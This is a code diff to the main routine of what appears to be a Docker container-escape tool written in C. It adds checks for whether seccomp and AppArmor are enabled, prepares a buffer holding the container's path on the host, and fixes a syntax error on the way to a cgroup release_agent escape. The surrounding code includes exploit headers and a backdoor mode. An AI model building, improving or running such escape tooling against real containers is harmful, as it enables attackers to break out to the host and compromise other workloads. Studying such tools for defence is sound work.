@@ -15,6 +15,7 @@
 #include <getopt.h>
 #include <stdio.h>
 #include <unistd.h>
+#include "docker/security.h"
 
 #include "docker/cgroup.h"
 #include "exploits/devices_allow.h"
@@ -160,6 +161,26 @@ int main(int argc, char *argv[]) {
         printf_wrapper(ERROR, "In backdoor mode, -B  must set\n");
         exit(EXIT_SUCCESS);
     }
+    printf_wrapper(INFO, "Check if container enable seccomp\n");
+    long int seccomp_status = seccomp_enable_check();
+    if (seccomp_status == 0) {
+        printf_wrapper(INFO, "Current container disabled seccomp\n");
+    } else if (seccomp_status == -1) {
+        printf_wrapper(ERROR, "Check if container enable seccomp failed\n");
+    } else {
+        printf_wrapper(WARNING, "Current container enable seccomp\n");
+    }
+
+    printf_wrapper(INFO, "Check if container enable apparmor\n");
+    int apparmor_status = apparmor_enable_check();
+    if (apparmor_status == 1) {
+        printf_wrapper(INFO, "Current container disabled apparmor\n");
+    } else if (apparmor_status == -1) {
+        printf_wrapper(ERROR, "Check if container enable apparmor failed\n");
+    } else {
+        printf_wrapper(WARNING, "Current container enable apparmor\n");
+    }
+
 
     printf_wrapper(INFO, "Check if the program is running in docker\n");
     char *cgroup_id = malloc(512 * sizeof(char));
@@ -176,6 +197,8 @@ int main(int argc, char *argv[]) {
                 printf_wrapper(ERROR,
                                "Current process don't have CAP_SYS_ADMIN capability，can't escape by using release_agent\n");
             }
+            release_agent_attack_info.container_path_in_host = (char *) malloc(512 * sizeof(char));
+            memset(release_agent_attack_info.container_path_in_host, 0x00, 512);
             if (attack_info.container_path[0] == 0x00) {
                 printf_wrapper(INFO, "Try to get container path in host\n");
                 char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
@@ -188,7 +211,7 @@ int main(int argc, char *argv[]) {
                 strcpy(release_agent_attack_info.container_path_in_host, container_path_in_host);
                 free(container_path_in_host);
             } else {
-                strcpy(release_agent_attack_info.container_path_in_host, attack_info.container_path)
+                strcpy(release_agent_attack_info.container_path_in_host, attack_info.container_path);
             }
             if (escape_by_release_agent() != 0) {
                 printf_wrapper(ERROR, "Escape by release_agent failed\n");
